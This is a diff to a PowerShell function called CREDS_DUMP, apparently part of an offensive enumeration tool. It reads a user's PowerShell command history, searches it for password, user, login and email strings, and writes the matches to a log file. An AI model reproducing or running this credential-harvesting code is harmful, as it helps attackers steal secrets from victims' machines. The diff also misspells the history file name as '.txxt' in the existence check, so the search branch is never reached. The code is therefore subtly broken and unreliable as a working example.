@@ -576,20 +576,25 @@ function CREDS_DUMP {
     }
 
     ## Search for passwords in { ConsoleHost_history }
-    echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
-    echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
+    If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txxt")){
+        echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
+        echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
         echo "ConsoleHost_history.txt not found .." >> $LogFilePath\BrowserEnum.log
     }else{
         $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
         $Json = Get-Content "$Path"|sls -pattern "passw","user","login","email"
         If(-not($Json) -or $Json -eq $null){
+            echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
+            echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
             echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
         }else{
             ## Loop in each string found
-            ForEach($token in $Json){
-                echo "$token" >> $LogFilePath\BrowserEnum.log
+            $MyPSObject = ForEach($token in $Json){
+                New-Object -TypeName PSObject -Property @{
+                    "Creds in ConsoleHost_history.txt" = $token
+                }
             }
+            echo $MyPSObject >> $LogFilePath\BrowserEnum.log
         }
     }
 }
